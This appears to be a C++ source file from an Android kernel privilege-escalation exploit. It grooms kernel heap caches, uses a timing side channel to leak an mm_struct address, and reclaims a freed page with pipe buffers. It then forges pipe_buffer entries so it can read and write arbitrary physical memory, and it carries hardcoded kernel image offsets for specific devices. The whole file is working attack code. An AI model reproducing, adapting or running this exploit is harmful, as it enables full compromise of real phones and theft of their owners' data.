#include "pipe_phys.h"

#include "aliases.h"
#include "page_engine.h"

#include <android/log.h>
#include <algorithm>
#include <array>
#include <atomic>
#include <cerrno>
#include <cstdarg>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>
#include <vector>

extern "C" {
void *ks_setup(size_t mm_sz, size_t order, size_t threads, size_t collisions);
void ks_find_collisions(void *ks);
int ks_found(void *ks);
void ks_bruteforce(void *ks);
uintptr_t ks_mm(void *ks);
void ks_cleanup(void *ks);
void ks_pin(int core);
}

namespace pe {
namespace {

constexpr uint64_t IMG_KMALLOC_CACHES = 0x156ccd0ULL;
constexpr uint64_t IMG_ANON_PIPE_BUF_OPS = 0x1077790ULL;

constexpr uint64_t DIRECT_MAP_BASE = 0xffffff8000000000ULL;
constexpr uint64_t DIRECT_MAP_END = 0xffffff9000000000ULL;
constexpr uint64_t VMEMMAP_START = 0xfffffffe00000000ULL;
constexpr size_t PAGE_SZ = 0x1000;
constexpr size_t STRUCT_PAGE_SIZE = 0x40;
constexpr size_t STRUCT_PAGE_COMPOUND_HEAD_OFF = 0x08;
constexpr size_t STRUCT_SLAB_CACHE_OFF = 0x18;

constexpr size_t MM_STRUCT_SZ = 0x400;
constexpr int MM_ORDER = 3;
constexpr int MM_PARTIALS = 5;
constexpr int KSNITCH_COLLISIONS = 4;
constexpr size_t ORDER3_SIZE = PAGE_SZ << MM_ORDER;
constexpr size_t SKB_SEND_SIZE = ORDER3_SIZE * 2;
constexpr int CORE = 4;

constexpr size_t PIPE_BUFFER_SLOTS = 32;
constexpr size_t PIPE_BUFFER_OBJECT_SIZE = 0x800;
constexpr size_t PIPE_OBJS_PER_SLAB = ORDER3_SIZE / PIPE_BUFFER_OBJECT_SIZE;
constexpr size_t PIPE_DRAIN_SLABS = 15;
constexpr size_t PIPE_RECLAIM_SLABS = 15;
constexpr size_t PIPE_DRAIN = PIPE_OBJS_PER_SLAB * PIPE_DRAIN_SLABS;
constexpr size_t PIPE_RECLAIM = PIPE_OBJS_PER_SLAB * PIPE_RECLAIM_SLABS;
constexpr uint32_t PIPE_BUF_FLAG_CAN_MERGE = 0x10;
/* Pixel upstream has four cache types (56 entries).  MTK carries additional
 * vendor/accounted types; its 2K pipe cache can sit past slot 63. */
constexpr size_t KMALLOC_CACHE_SLOTS = 128;

struct user_pipe_buffer {
    uint64_t page;
    uint32_t offset;
    uint32_t len;
    uint64_t ops;
    uint32_t flags;
    uint32_t pad;
    uint64_t private_data;
};
static_assert(sizeof(user_pipe_buffer) == 0x28);

struct mm_ctx {
    std::vector<pid_t> children;
    std::vector<int> memfds;
};

static std::vector<std::array<int, 2>> g_drain;
static std::vector<std::array<int, 2>> g_reclaim;
static pid_t g_prepare_child = -1;
static uintptr_t g_pipe_page = 0;
static uintptr_t g_pipe_buffer = 0;
static int g_pipe_index = -1;
static void *g_ks = nullptr;

void logp(const char *fmt, ...) {
    char buf[768];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    __android_log_print(ANDROID_LOG_INFO, "gl_pipe", "%s", buf);
    dprintf(STDERR_FILENO, "[pipe] %s\n", buf);
    const char *status_path = getenv("GL_STATUS_PATH");
    if (status_path && status_path[0]) {
        int fd = open(status_path, O_WRONLY | O_APPEND | O_CLOEXEC);
        if (fd >= 0) {
            dprintf(fd, "[pipe] %s\n", buf);
            fsync(fd);
            close(fd);
        }
    }
}

bool direct_ptr(uint64_t value) {
    return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

uintptr_t direct_to_page(uintptr_t addr) {
    uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> 12;
    return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

uintptr_t page_to_direct(uintptr_t page) {
    uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
    return DIRECT_MAP_BASE + (pfn << 12);
}

bool vmemmap_ptr(uint64_t value) {
    constexpr uint64_t pages = (DIRECT_MAP_END - DIRECT_MAP_BASE) >> 12;
    constexpr uint64_t end = VMEMMAP_START + pages * STRUCT_PAGE_SIZE;
    return value >= VMEMMAP_START && value < end &&
           ((value - VMEMMAP_START) % STRUCT_PAGE_SIZE) == 0;
}

pid_t clone_pause_child() {
    pid_t child = static_cast<pid_t>(syscall(SYS_clone, SIGCHLD, nullptr,
                                              nullptr, nullptr, 0));
    if (child == 0) {
        prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
        ks_pin(CORE);
        for (;;) pause();
    }
    return child;
}

pid_t clone_leak_child() {
    pid_t child = static_cast<pid_t>(syscall(SYS_clone, SIGCHLD, nullptr,
                                              nullptr, nullptr, 0));
    if (child == 0) {
        ks_find_collisions(g_ks);
        _exit(0);
    }
    return child;
}

int open_memfd(pid_t child) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/mem", child);
    return open(path, O_RDONLY | O_CLOEXEC);
}

bool fill_ctx(mm_ctx &ctx, size_t count, bool eager_allowed = true) {
    ctx.children.reserve(count);
    ctx.memfds.reserve(count);
    const bool eager = eager_allowed;
    /* Match upstream clone_memfd() exactly: clone, open /proc/pid/mem, then
     * kill/reap before allocating the next mm_struct.  Batching live tasks
     * changes the mm-cache freelist sequence even though their memfds pin the
     * eventual objects. */
    const size_t batch_size = eager ? 1 : count;
    for (size_t base = 0; base < count; base += batch_size) {
        const size_t end = std::min(base + batch_size, count);
        for (size_t i = base; i < end; ++i) {
            pid_t child = clone_pause_child();
            if (child <= 0) return false;
            int fd = open_memfd(child);
            if (fd < 0) return false;
            ctx.children.push_back(child);
            ctx.memfds.push_back(fd);
        }
        if (eager) {
            for (size_t i = base; i < end; ++i) {
                pid_t &child = ctx.children[i];
                kill(child, SIGKILL);
                while (waitpid(child, nullptr, 0) < 0 && errno == EINTR) {}
                child = -1;
            }
        }
    }
    return true;
}

void kill_children(mm_ctx &ctx) {
    for (pid_t child : ctx.children) {
        if (child > 0) kill(child, SIGKILL);
    }
    for (pid_t child : ctx.children) {
        if (child > 0) while (waitpid(child, nullptr, 0) < 0 && errno == EINTR) {}
    }
}

bool resize_pipe(const std::array<int, 2> &p, size_t slots) {
    return fcntl(p[0], F_SETPIPE_SZ, static_cast<int>(slots * PAGE_SZ)) >= 0;
}

bool make_pipe(std::array<int, 2> &p) {
    int raw[2];
    if (pipe2(raw, O_CLOEXEC) != 0) return false;
    p = {raw[0], raw[1]};
    if (!resize_pipe(p, 2)) {
        close(p[0]);
        close(p[1]);
        p = {-1, -1};
        return false;
    }
    return true;
}

void close_pipes(std::vector<std::array<int, 2>> &pipes) {
    for (auto &p : pipes) {
        if (p[0] >= 0) close(p[0]);
        if (p[1] >= 0) close(p[1]);
        p = {-1, -1};
    }
    pipes.clear();
}

uintptr_t prepare_pipe_page_child() {
    logp("prepare child start");
    const size_t objs = ORDER3_SIZE / MM_STRUCT_SZ;
    mm_ctx prep, spray, pre, post;
    if (!fill_ctx(prep, 32 * objs) ||
        !fill_ctx(spray, (1 + MM_PARTIALS) * objs)) {
        logp("FAIL fill prep/spray errno=%d", errno); return 0;
    }
    logp("fill prep/spray done prep=%zu spray=%zu", prep.memfds.size(), spray.memfds.size());

    int cpus = static_cast<int>(sysconf(_SC_NPROCESSORS_ONLN));
    g_ks = ks_setup(MM_STRUCT_SZ, MM_ORDER, cpus, KSNITCH_COLLISIONS);
    if (!g_ks) { logp("FAIL ks_setup"); return 0; }
    if (!fill_ctx(pre, objs - 1)) { logp("FAIL fill pre errno=%d", errno); return 0; }
    pid_t leak_child = clone_leak_child();
    if (leak_child <= 0 || !fill_ctx(post, objs)) {
        logp("FAIL leak child/fill post pid=%d errno=%d", leak_child, errno); return 0;
    }
    int leak_memfd = open_memfd(leak_child);
    if (leak_memfd < 0) { logp("FAIL leak memfd errno=%d", errno); return 0; }

    kill_children(pre);
    kill_children(post);
    kill_children(spray);
    while (waitpid(leak_child, nullptr, 0) < 0 && errno == EINTR) {}
    if (!ks_found(g_ks)) { logp("FAIL ks collisions"); return 0; }
    logp("ks collisions ready");

    std::vector<unsigned char> buffer(SKB_SEND_SIZE, 0x50);
    int skb[2] = {-1, -1};
    int pcp[2] = {-1, -1};
    if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, skb) != 0 ||
        socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, pcp) != 0) {
        logp("FAIL socketpair errno=%d", errno); return 0;
    }
    int sndbuf = 1 << 20;
    setsockopt(skb[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    setsockopt(pcp[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    iovec iov{buffer.data(), buffer.size()};
    msghdr msg{};
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    if (sendmsg(pcp[0], &msg, 0) < 0) { logp("FAIL pcp send errno=%d", errno); return 0; }

    ks_pin(CORE);
    for (int i = 0; i < 4; ++i) sched_yield();
    for (int fd : pre.memfds) close(fd);
    for (size_t i = 0; i + 1 < post.memfds.size(); ++i) close(post.memfds[i]);
    for (size_t i = 0; i < spray.memfds.size(); i += objs) close(spray.memfds[i]);
    close(pcp[0]);
    close(pcp[1]);
    for (int i = 0; i < 4; ++i) sched_yield();
    close(leak_memfd);
    if (sendmsg(skb[0], &msg, 0) < 0) { logp("FAIL reclaim send errno=%d", errno); return 0; }

    ks_bruteforce(g_ks);
    uintptr_t leaked = ks_mm(g_ks);
    ks_cleanup(g_ks);
    g_ks = nullptr;
    if (leaked == static_cast<uintptr_t>(-1) || leaked == 0) {
        logp("FAIL ks brute leaked=%016llx", static_cast<unsigned long long>(leaked)); return 0;
    }
    uintptr_t base = leaked & ~(ORDER3_SIZE - 1);

    /* kernelsnitch_bruteforce() resets affinity for its worker fan-out.
     * Re-pin before the pipe drain/reclaim allocations or they can run on a
     * different CPU and miss the order-3 block just freed into CORE's PCP. */
    ks_pin(CORE);
    for (int i = 0; i < 4; ++i) sched_yield();
    for (const auto &p : g_drain) {
        if (!resize_pipe(p, PIPE_BUFFER_SLOTS)) { logp("FAIL drain resize errno=%d", errno); return 0; }
    }
    close(skb[0]);
    close(skb[1]);
    for (const auto &p : g_reclaim) {
        if (!resize_pipe(p, PIPE_BUFFER_SLOTS)) { logp("FAIL reclaim resize errno=%d", errno); return 0; }
    }
    logp("reclaimed candidate order3 base=%016llx",
         static_cast<unsigned long long>(base));
    return base;
}

uintptr_t prepare_pipe_page() {
    logp("prepare pipe page start");
    g_drain.assign(PIPE_DRAIN, {-1, -1});
    g_reclaim.assign(PIPE_RECLAIM, {-1, -1});
    for (auto &p : g_drain) if (!make_pipe(p)) { logp("FAIL make drain errno=%d", errno); return 0; }
    for (auto &p : g_reclaim) if (!make_pipe(p)) { logp("FAIL make reclaim errno=%d", errno); return 0; }

    int result[2];
    if (pipe2(result, O_CLOEXEC) != 0) { logp("FAIL result pipe errno=%d", errno); return 0; }
    pid_t child = fork();
    if (child == 0) {
        close(result[0]);
        uintptr_t base = prepare_pipe_page_child();
        (void)!write(result[1], &base, sizeof(base));
        close(result[1]);
        for (;;) pause();
    }
    close(result[1]);
    if (child <= 0) {
        close(result[0]);
        return 0;
    }
    g_prepare_child = child;
    uintptr_t base = 0;
    ssize_t got = read(result[0], &base, sizeof(base));
    close(result[0]);
    if (got != static_cast<ssize_t>(sizeof(base)) || !direct_ptr(base)) {
        logp("FAIL child result got=%zd base=%016llx", got,
             static_cast<unsigned long long>(base));
        kill(child, SIGKILL);
        while (waitpid(child, nullptr, 0) < 0 && errno == EINTR) {}
        g_prepare_child = -1;
        return 0;
    }
    return base;
}

uintptr_t head_page(uintptr_t direct) {
    uintptr_t page = direct_to_page(direct);
    uint64_t compound = kernel_read64(page + STRUCT_PAGE_COMPOUND_HEAD_OFF);
    return (compound & 1) ? (compound & ~1ULL) : page;
}

bool cache_in_kmalloc_array(uint64_t cache) {
    uint64_t slots[KMALLOC_CACHE_SLOTS]{};
    uint64_t address = LINEAR_MAP_BASE + IMG_KMALLOC_CACHES;
    if (!kread(address, slots, sizeof(slots))) {
        logp("kmalloc cache array read failed address=%016llx",
             static_cast<unsigned long long>(address));
        return false;
    }
    for (size_t i = 0; i < KMALLOC_CACHE_SLOTS; ++i) {
        if (slots[i] == cache) {
            logp("kmalloc cache match slot=%zu cache=%016llx", i,
                 static_cast<unsigned long long>(cache));
            return true;
        }
    }
    return false;
}

bool select_pipe_cache_page(uintptr_t order3_base) {
    for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SZ) {
        uintptr_t direct = order3_base + off;
        uintptr_t head = head_page(direct);
        uint64_t cache = kernel_read64(head + STRUCT_SLAB_CACHE_OFF);
        logp("page[%zu] direct=%016llx head=%016llx cache=%016llx",
             off / PAGE_SZ,
             static_cast<unsigned long long>(direct),
             static_cast<unsigned long long>(head),
             static_cast<unsigned long long>(cache));
        if (cache && cache_in_kmalloc_array(cache)) {
            /* Do not inspect kmem_cache fields through configfs: the
             * kmem_cache meta-cache has its own hardened-usercopy boundary.
             * The reclaimed order-3 block was filled only by 32-slot pipe
             * arrays, and membership in kmalloc_caches[] is a sufficient
             * corruption guard before scanning for exact pipe_buffer shape. */
            g_pipe_page = direct;
            logp("pipe cache page=%016llx cache=%016llx",
                 static_cast<unsigned long long>(direct),
                 static_cast<unsigned long long>(cache));
            return true;
        }
    }
    return false;
}

bool locate_pipe_buffer() {
    std::vector<unsigned char> page(PAGE_SZ);
    /* kmalloc-2k permits usercopy within one object, not across adjacent
     * objects.  Match upstream's bounded slab scan instead of issuing one
     * page-sized configfs read. */
    constexpr size_t scan_chunk = 0x400;
    for (size_t off = 0; off < page.size(); off += scan_chunk) {
        if (!kread(g_pipe_page + off, page.data() + off, scan_chunk))
            return false;
    }
    uint64_t expected_ops = get_kaslr_base() + IMG_ANON_PIPE_BUF_OPS;
    for (size_t off = 0; off + sizeof(user_pipe_buffer) <= page.size(); off += 8) {
        user_pipe_buffer pb{};
        memcpy(&pb, page.data() + off, sizeof(pb));
        if (!vmemmap_ptr(pb.page) || pb.offset != 0 ||
            pb.ops != expected_ops || pb.flags != PIPE_BUF_FLAG_CAN_MERGE ||
            pb.private_data != 0 || pb.len == 0 || pb.len > PIPE_RECLAIM) continue;
        g_pipe_buffer = g_pipe_page + off;
        g_pipe_index = static_cast<int>(pb.len - 1);
        logp("pipe_buffer=%016llx idx=%d page=%016llx ops=%016llx len=%u",
             static_cast<unsigned long long>(g_pipe_buffer), g_pipe_index,
             static_cast<unsigned long long>(pb.page),
             static_cast<unsigned long long>(pb.ops), pb.len);
        return true;
    }
    return false;
}

bool raw_pipe_read(uint64_t direct_addr, void *out, size_t len) {
    if (g_pipe_index < 0 || !direct_ptr(direct_addr) || len == 0 ||
        (direct_addr & (PAGE_SZ - 1)) + len > PAGE_SZ) return false;
    user_pipe_buffer saved{};
    if (!kread(g_pipe_buffer, &saved, sizeof(saved))) return false;
    user_pipe_buffer forged = saved;
    forged.page = direct_to_page(direct_addr);
    forged.offset = static_cast<uint32_t>(direct_addr & (PAGE_SZ - 1));
    forged.len = static_cast<uint32_t>(len + 1);
    forged.ops = get_kaslr_base() + IMG_ANON_PIPE_BUF_OPS;
    forged.flags = PIPE_BUF_FLAG_CAN_MERGE;
    forged.private_data = 0;
    if (!kwrite(g_pipe_buffer, &forged, sizeof(forged))) return false;
    ssize_t got = read(g_reclaim[g_pipe_index][0], out, len);
    bool restored = kwrite(g_pipe_buffer, &saved, sizeof(saved));
    return got == static_cast<ssize_t>(len) && restored;
}

bool raw_pipe_write(uint64_t direct_addr, const void *data, size_t len) {
    if (g_pipe_index < 0 || !direct_ptr(direct_addr) || len == 0 ||
        (direct_addr & (PAGE_SZ - 1)) + len > PAGE_SZ) return false;
    user_pipe_buffer saved{};
    if (!kread(g_pipe_buffer, &saved, sizeof(saved))) return false;
    user_pipe_buffer forged = saved;
    forged.page = direct_to_page(direct_addr);
    forged.offset = static_cast<uint32_t>(direct_addr & (PAGE_SZ - 1));
    forged.len = 0;
    forged.ops = get_kaslr_base() + IMG_ANON_PIPE_BUF_OPS;
    forged.flags = PIPE_BUF_FLAG_CAN_MERGE;
    forged.private_data = 0;
    if (!kwrite(g_pipe_buffer, &forged, sizeof(forged))) return false;
    ssize_t wrote = write(g_reclaim[g_pipe_index][1], data, len);
    bool restored = kwrite(g_pipe_buffer, &saved, sizeof(saved));
    return wrote == static_cast<ssize_t>(len) && restored;
}

}  // namespace

bool install_pipe_physrw() {
    uintptr_t base = prepare_pipe_page();
    if (!base) { logp("FAIL no reclaimed base"); return false; }
    if (!select_pipe_cache_page(base)) { logp("FAIL select pipe cache page"); return false; }

    std::vector<unsigned char> marker(PIPE_RECLAIM, 0x61);
    for (size_t i = 0; i < g_reclaim.size(); ++i) {
        if (write(g_reclaim[i][1], marker.data(), i + 1) !=
            static_cast<ssize_t>(i + 1)) { logp("FAIL marker pipe=%zu errno=%d", i, errno); return false; }
    }
    if (!locate_pipe_buffer()) { logp("FAIL locate pipe buffer"); return false; }

    uint64_t scratch = get_fake_fops() + 0x2000;
    const uint64_t seed = 0x306365737562656eULL;
    const uint64_t next = 0x316365737562656eULL;
    if (!kwrite(scratch, &seed, sizeof(seed))) { logp("FAIL seed kwrite"); return false; }
    uint64_t got = 0;
    if (!raw_pipe_read(scratch, &got, sizeof(got)) || got != seed) { logp("FAIL raw read got=%016llx", static_cast<unsigned long long>(got)); return false; }
    if (!raw_pipe_write(scratch, &next, sizeof(next))) { logp("FAIL raw write"); return false; }
    got = 0;
    if (!kread(scratch, &got, sizeof(got)) || got != next) { logp("FAIL verify got=%016llx", static_cast<unsigned long long>(got)); return false; }
    logp("physical pipe R/W self-test passed scratch=%016llx",
         static_cast<unsigned long long>(scratch));
    return true;
}

bool phys_read(uint64_t direct_addr, void *out, size_t len) {
    unsigned char *dst = static_cast<unsigned char *>(out);
    while (len) {
        size_t chunk = PAGE_SZ - (direct_addr & (PAGE_SZ - 1));
        if (chunk > len) chunk = len;
        if (!raw_pipe_read(direct_addr, dst, chunk)) return false;
        direct_addr += chunk;
        dst += chunk;
        len -= chunk;
    }
    return true;
}

bool phys_write(uint64_t direct_addr, const void *data, size_t len) {
    const unsigned char *src = static_cast<const unsigned char *>(data);
    while (len) {
        size_t chunk = PAGE_SZ - (direct_addr & (PAGE_SZ - 1));
        if (chunk > len) chunk = len;
        if (!raw_pipe_write(direct_addr, src, chunk)) return false;
        direct_addr += chunk;
        src += chunk;
        len -= chunk;
    }
    return true;
}

uint64_t phys_read64(uint64_t direct_addr) {
    uint64_t value = 0;
    return phys_read(direct_addr, &value, sizeof(value)) ? value : 0;
}

bool phys_write64(uint64_t direct_addr, uint64_t value) {
    return phys_write(direct_addr, &value, sizeof(value));
}

}  // namespace pe
